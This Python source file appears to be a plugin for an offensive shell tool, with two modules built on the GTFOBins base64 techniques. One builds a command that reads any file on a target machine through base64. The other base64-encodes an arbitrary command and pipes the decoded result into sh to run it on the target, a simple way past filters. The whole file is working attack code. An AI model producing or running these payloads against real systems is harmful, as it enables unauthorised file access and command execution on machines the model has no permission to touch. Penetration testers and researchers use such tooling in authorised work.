from ogabog.cores import plugin
import base64


class ReadFile(plugin.BaseShell):
    def __init__(self):
        super().__init__()
        # self.shell_type = 3
        self.is_interactive = False
        self.add_args(
            "--target-file",
            default="/etc/os-release",
            help="File to read on target machine"
        )
        self.opts.description = "https://gtfobins.github.io/gtfobins/base64/"
        self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"

    def make_shell(self):
        self.shell = f"base64 \"{self.args.target_file}\" | base64 --decode"


class Command(plugin.BaseShell):
    def __init__(self):
        super().__init__()
        # self.shell_type = 3
        self.is_interactive = False
        self.add_args(
            "--command",
            default="/usr/bin/id",
            help="Command to run on target machine"
        )
        self.opts.description = "https://gtfobins.github.io/gtfobins/base64/"
        self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"

    def make_shell(self):
        command = base64.b64encode(self.args.command.encode('utf8')).decode('utf-8')
        self.shell = f"echo {command} | base64 -d | sh"
